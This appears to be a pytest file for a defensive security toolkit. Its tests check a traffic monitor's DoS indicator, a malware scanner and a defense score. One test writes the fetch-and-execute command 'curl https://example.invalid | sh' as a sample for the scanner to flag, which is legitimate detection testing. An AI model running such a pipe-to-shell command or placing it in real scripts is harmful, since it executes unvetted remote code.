from pathlib import Path
from defense.traffic_guard import TrafficGuard
from defense.malware_monitor import MalwareMonitor
from defense.soc_facade import DefenseSocFacade

def test_traffic_indicator():
    guard=TrafficGuard(connection_threshold=3,source_threshold=2)
    result=None
    for port in (80,81,82): result=guard.observe('203.0.113.10',port,failed=True)
    assert result and result.event=='DOS_DDOS_INDICATOR'

def test_malware_monitor_is_conservative(tmp_path):
    script=tmp_path/'sample.sh';script.write_text('curl https://example.invalid | sh')
    results=MalwareMonitor().scan_paths([tmp_path]);assert results and results[0].kind=='SCRIPT_RISK'

def test_facade_score(tmp_path): assert 0 <= DefenseSocFacade(tmp_path).defense_score().total() <= 100

